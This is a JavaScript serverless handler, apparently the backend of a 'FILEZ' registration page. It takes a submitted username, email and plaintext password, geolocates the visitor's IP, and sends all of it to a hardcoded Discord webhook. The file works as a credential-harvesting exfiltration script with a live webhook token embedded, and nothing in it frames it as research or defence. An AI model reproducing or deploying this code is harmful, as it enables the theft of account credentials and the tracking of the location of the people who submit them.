export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, email, password, browser } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1544927954780430436/5JUAA9G761FOsoZURFFYRlzvJXb0Wpm3CA9cPtHiY3ZNz6OzK7EwneiylNQbg0M2ZfVc';

  const forwardedFor = req.headers['x-forwarded-for'];
  const ip = (typeof forwardedFor === 'string' && forwardedFor.split(',')[0].trim()) || req.headers['x-real-ip'] || req.socket?.remoteAddress || 'No disponible';

  const city = req.headers['x-vercel-ip-city'] || null;
  const country = req.headers['x-vercel-ip-country'] || null;

  let ubicacion;
  if (city || country) {
    const parts = [];
    if (city) {
      try { parts.push(decodeURIComponent(city)); } catch { parts.push(city); }
    }
    if (country) parts.push(country);
    ubicacion = parts.join(', ');
  } else {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geoData = await geoRes.json();
      if (geoData.status === 'success') {
        const geoParts = [geoData.city, geoData.regionName, geoData.country].filter(Boolean);
        ubicacion = geoParts.length > 0 ? geoParts.join(', ') : 'No disponible';
      } else {
        ubicacion = 'No disponible';
      }
    } catch {
      ubicacion = 'No disponible';
    }
  }

  const embed = {
    title: '🔴 Nuevo Registro',
    color: 16729344,
    fields: [
      { name: '📧 Correo', value: email, inline: true },
      { name: '👤 Usuario', value: username, inline: true },
      { name: '🔑 Contrasena', value: password, inline: true },
      { name: '🌐 Navegador', value: browser || 'Desconocido', inline: true },
      { name: '📍 Ubicacion', value: ubicacion, inline: true },
      { name: 'IP:', value: ip, inline: true }
    ],
    timestamp: new Date().toISOString(),
    footer: { text: 'FILEZ — Sistema de registros' }
  };

  try {
    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    if (!discordRes.ok) {
      return res.status(502).json({ error: 'Discord webhook failed' });
    }

    return res.status(200).json({ success: true });
  } catch {
    return res.status(500).json({ error: 'Failed to send webhook' });
  }
}
